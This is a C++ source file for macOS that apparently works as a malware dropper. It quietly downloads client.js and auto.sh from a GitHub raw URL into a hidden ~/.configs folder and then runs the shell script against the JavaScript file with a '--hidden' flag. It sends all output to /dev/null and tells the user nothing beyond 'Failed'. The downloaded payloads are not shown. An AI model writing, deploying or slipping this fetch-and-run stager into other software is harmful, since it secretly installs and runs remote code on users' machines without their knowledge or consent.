// main.cpp — macOS
// Build: clang++ -std=c++17 -O2 -o downloader main.cpp
#include <cerrno>
#include <cstdlib>
#include <filesystem>
#include <iostream>
#include <string>
#include <vector>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>

namespace fs = std::filesystem;

static bool is_executable_file(const std::string& path) {
    struct stat st;
    if (stat(path.c_str(), &st) != 0) return false;
    if (!S_ISREG(st.st_mode)) return false;
    return access(path.c_str(), X_OK) == 0;
}

static bool command_exists(const std::string& name) {
    if (name.find('/') != std::string::npos) return is_executable_file(name);
    const char* path_env = std::getenv("PATH");
    if (!path_env) return false;
    std::string p(path_env);
    size_t start = 0;
    while (true) {
        size_t end = p.find(':', start);
        std::string dir = (end == std::string::npos) ? p.substr(start)
                                                     : p.substr(start, end - start);
        if (dir.empty()) dir = ".";
        if (is_executable_file(dir + "/" + name)) return true;
        if (end == std::string::npos) break;
        start = end + 1;
    }
    return false;
}

// fork+exec with stdout & stderr redirected to /dev/null.
// Returns child's exit code (128+signal if killed), or -1 on fork/wait failure.
static int run_silenced(const std::vector<std::string>& args) {
    std::cout.flush();
    std::cerr.flush();          // don't let buffered parent output leak into child

    pid_t pid = fork();
    if (pid < 0) return -1;

    if (pid == 0) {
        int fd = open("/dev/null", O_WRONLY);
        if (fd >= 0) {
            dup2(fd, STDOUT_FILENO);
            dup2(fd, STDERR_FILENO);
            if (fd > STDERR_FILENO) close(fd);
        }
        std::vector<char*> argv;
        argv.reserve(args.size() + 1);
        for (const auto& a : args) argv.push_back(const_cast<char*>(a.c_str()));
        argv.push_back(nullptr);
        execvp(argv[0], argv.data());
        _exit(127);
    }

    int status = 0;
    pid_t w;
    do { w = waitpid(pid, &status, 0); } while (w == -1 && errno == EINTR);
    if (w == -1) return -1;
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    return 128 + WTERMSIG(status);
}

static bool save_hidden_file(const std::string& url, const std::string& target) {
    // macOS always ships /usr/bin/curl; still prefer PATH lookup in case a
    // newer one was installed (e.g. Homebrew).
    std::string curl_bin;
    if      (command_exists("curl"))          curl_bin = "curl";
    else if (command_exists("/usr/bin/curl")) curl_bin = "/usr/bin/curl";
    else return false;

    // -f : fail on HTTP >= 400 (otherwise 404 page is saved as the file)
    // -s : silent
    // -S : re-enable error messages (needed because we use -s)
    // -L : follow redirects (raw.githubusercontent may redirect)
    int rc = run_silenced({curl_bin, "-fsSL", "--tlsv1.2",
                           "-o", target, url});
    if (rc != 0) return false;

    std::error_code ec;
    fs::permissions(target,
                    fs::perms::owner_read | fs::perms::owner_write,
                    fs::perms::replace, ec);
    return !ec;
}

int main() {
    const char* home_env = std::getenv("HOME");
    if (!home_env || !*home_env) { std::cout << "Failed\n"; return 1; }

    const std::string config_path = std::string(home_env) + "/.configs";

    std::error_code ec;
    fs::create_directories(config_path, ec);
    if (!fs::is_directory(config_path, ec)) { std::cout << "Failed\n"; return 1; }

    const std::string base =
        "https://raw.githubusercontent.com/rahul-call/inner/main/ror/";
    const char* files[] = { "client.js", "auto.sh" };

    for (const char* name : files) {
        const std::string target = config_path + "/" + name;
        if (!save_hidden_file(base + name, target)) {
            std::cout << "Failed\n";
            return 1;
        }
    }

    const std::string auto_sh   = config_path + "/auto.sh";
    const std::string client_js = config_path + "/client.js";

    int rc = run_silenced({"bash", auto_sh, client_js, "--hidden"});
    if (rc != 0) { std::cout << "Failed\n"; return 1; }
    return 0;
}
